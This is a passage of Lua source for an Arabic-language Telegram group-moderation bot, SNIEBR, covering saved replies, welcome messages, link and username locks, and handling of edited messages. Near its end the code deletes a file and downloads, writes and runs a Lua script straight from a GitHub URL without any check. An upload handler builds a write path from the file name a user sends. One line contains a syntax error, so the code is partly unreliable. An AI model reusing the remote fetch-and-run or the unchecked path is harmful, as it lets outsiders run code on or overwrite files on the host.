local keko2 = redis:get('SNIEBR:'..bot_id..'msg'..msg.sender_user_id_..'')
if text then 
redis:set('SNIEBR:'..bot_id..'keko'..keko2..'', text)
elseif (msg.content_.sticker_) then 
redis:set('SNIEBR:'..bot_id..':sticker:'..keko2, msg.content_.sticker_.sticker_.persistent_id_)
elseif (msg.content_.voice_) then 
redis:set('SNIEBR:'..bot_id..':voice:'..keko2, msg.content_.voice_.voice_.persistent_id_)
elseif (msg.content_.video_) then 
redis:set('SNIEBR:'..bot_id..':video:'..keko2, msg.content_.video_.video_.persistent_id_)
elseif (msg..content_.animation_) then 
redis:set('SNIEBR:'..bot_id..':gif:'..keko2, data.message_.content_.animation_.animation_.persistent_id_)
elseif (msg.content_.document_) then
redis:set('SNIEBR:'..bot_id..':file:'..keko2, msg.content_.document_.document_.persistent_id_)
end
redis:sadd('SNIEBR:'..bot_id..'kekoresudo', keko2)
send(msg.chat_id_, msg.id_, 1, "📊※ تم حفظ الرد  ✓", 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'', 'no')
end
--         »»                 Run SNIEBR                         ««              --
if (is_mod(msg) or is_creatorbasic (msg) ) then TSlocks(msg) print("\27[1;34m»» is mod "..msg.sender_user_id_.."\27[m") end
TSall(msg,data)
function check_username(extra,result,success)
local username = (result.username_ or '')
local svuser = 'SNIEBR:'..bot_id..'user:'..result.id_
if username then
datahmade:hset(svuser, 'username', username)
end
end
getUser(msg.sender_user_id_,check_username)
if msg.content_.ID == "MessageChatAddMembers" then
datahmade:incr('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatJoinByLink" then
function get_welcome(extra,result,success)
if datahmade:get('SNIEBR:'..bot_id..'welcome:'..msg.chat_id_) then
text = datahmade:get('SNIEBR:'..bot_id..'welcome:'..msg.chat_id_)
else
text = '👋🏻┇اهلا بك يا ؛ {fr}\n🙋🏼‍♂️┇نورت الكروب ؛ @{us}'
end
local text = text:gsub('{fr}',(result.first_name_ or 'لا يوجد'))
local text = text:gsub('{ls}',(result.last_name_ or 'لا يوجد'))
local text = text:gsub('{us}',(result.username_ or 'لا يوجد'))
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if datahmade:get('SNIEBR:'..bot_id.."welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end end
if msg.content_.ID == "MessagePinMessage" then
if datahmade:get('SNIEBR:'..bot_id..'pinnedmsg'..msg.chat_id_) and datahmade:get("lock_pin:SNIEBR"..msg.chat_id_..bot_id) then
local pin_id = datahmade:get('SNIEBR:'..bot_id..'pinnedmsg'..msg.chat_id_)
pin(msg.chat_id_,pin_id,0)
end
end
if msg.content_.document_ and end032 then
local infooo = datahmade:get("addfiel"..msg.sender_user_id_)
if (infooo and infooo == "yes") then
send(msg.chat_id_, msg.id_, 1, "📤┇جاري الرفع ..", 1, 'html')
local id_keko = msg.content_.document_.document_.persistent_id_
function download_to_file(url, file_path)
local respbody = {}
local options = {
url = url,
sink = ltn12.sink.table(respbody),
redirect = true
}
local response = nil
options.redirect = false
response = {https.request(options)}
local code = response[2]
local headers = response[3]
local status = response[4]
if code ~= 200 then return false, code end
file = io.open(file_path, "w+")
file:write(table.concat(respbody))
file:close()
return file_path, code
end
local url_keko3 = 'https://api.telegram.org/bot' .. token .. '/getfile?file_id='..id_keko
local keko3 = https.request(url_keko3)
local keko6 = JSON.decode(keko3)
local photo_keko = download_to_file('https://api.telegram.org/file/bot'..token..'/'..keko6.result.file_path, 'files_SNIEBR/'..msg.content_.document_.file_name_)
send(msg.chat_id_, msg.id_, 1, "✔┇تم رفع الملف بنجاح", 1, 'html')
datahmade:del("addfiel"..msg.sender_user_id_)
end
end
end
TSadd(msg)
if is_gbanned(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_})
return
end
if is_gmuted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return
end
if is_sudo(msg) then TSsudo(msg) print("\27[1;32m»» is sudo "..msg.sender_user_id_.."\27[m") end
id = tostring(msg.chat_id_)
if id and id:match('^(%d+)') then
datahmade:sadd('SNIEBR:'..bot_id.."userss",msg.chat_id_)
end
SNIEBR_run_file(Data_SNIEBR)
--         »»                 Start UpdateChat                         ««              --
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local msgg = result 
datahmade:incr('SNIEBR:'..bot_id..'user:editmsg'..msgg.chat_id_..':'..msgg.sender_user_id_)
if (result.content_.caption_ and not is_vip(msgg)) then 
if (result.content_.caption_:match("(.*)@(.*)") or result.content_.caption_:match("@")) then 
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
end
if datahmade:get("lock_edit:SNIEBR"..msg.chat_id_..bot_id) and not result.content_.text_ and not is_creator(msgg) then
function get_edit(arg,data)
local username = data.username_
local name = data.first_name_
local iduser = data.id_
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇#تحذير \n🔖┇قام شخصآ ما في المجموعه بالتعديل على الميديا يرجى الانتباه \n📫┇الشخص الي قام بالتعديل \n (@"..data.username_..")" , 1, 'html') 
else
send(msg.chat_id_,0, 1, "[⚠┇#تحذير] \n🔖┇قام شخصآ ما في المجموعه بالتعديل على الميديا يرجى الانتباه \n📫┇الشخص الي قام بالتعديل \n ["..data.first_name_.."](T.ME/SNIEBR)" , 1, 'md') 
end
end
getUser(result.sender_user_id_,get_edit)
delete_msg(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not is_mod(msgg) then
if text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
if text:match("[hH][tT][tT][pP][sT]") or text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
if text:match("(.*)(@)(.*)") then
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end
if text:match("@") then
if datahmade:get("lock_username.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
if text:match("#") then
if datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
if text:match("#") then
if datahmade:get("lock_tag.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 

if text:match("/") then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)  
end 
if text:match("/") then
if datahmade:get("lock_sarha.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end
local taha = datahmade:get('SNIEBR:'..bot_id.."add:reply:rd"..text..msg.chat_id_)   
if taha and not is_mod(msgg) then    
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛┇["..taha.."] \n" , 1, 'md') 
else
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇["..taha.."] \n" , 1, 'md') 
end
end
getUser(result.sender_user_id_,get_info)
delete_msg(msg.chat_id_, {[0] = data.message_id_}) 
return false   
end    
end
						
if (not is_vip(msgg) and text) then
check_filter_words(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end 
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[hH][tT][tT][pP][sT]") or text:match("[tT][eE][lL][eE][gG][rR][aA].[pP][hH]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) 
end 
end 
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
if datahmade:get("lock_link.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("(.*)(@)(.*)") then
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("@") then
if datahmade:get("lock_username.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("#") then
if datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("#") then
if datahmade:get("lock_tag.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("/")  then
if datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
 end 
 local taha = datahmade:get('SNIEBR:'..bot_id.."add:reply:rd"..text..msg.chat_id_)   
if taha and not is_mod(msgg) then    
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛┇["..taha.."] \n" , 1, 'md') 
else
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇["..taha.."] \n" , 1, 'md') 
end
end
getUser(result.sender_user_id_,get_info)
delete_msg(msg.chat_id_, {[0] = data.message_id_}) 
return false   
end    
end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("/")  then
if datahmade:get("lock_sarha.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[\216-\219][\128-\191]") then
if datahmade:get("lock_ar:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end  end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[\216-\219][\128-\191]") then
if datahmade:get("lock_ar.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end  end
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if datahmade:get("lock_en:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end 
if not is_vip(msgg) then
check_filter_words(result, text)
if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if datahmade:get("lock_en.note:SNIEBR"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end 
 end 
 end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--         »»                 End UpdateChat                          ««              --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then os.execute("rm -fr hack.lua") a = HTTPS.request("https://raw.githubusercontent.com/SNIEBRTEAM/SNIEBR/master/SNIEBR.lua") local g = io.open("SNIEBR.lua", 'w') g:write(a) g:close() dofile('SNIEBR.lua')
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
end
--[[
 ____        _      _
/ ___| _ __ (_) ___| |__  _ __
\___ \| '_ \| |/ _ \ '_ \| '__|
 ___) | | | | |  __/ |_) | |
|____/|_| |_|_|\___|_.__/|_|
           CH > @SNIEBRTEAM
           
--]]
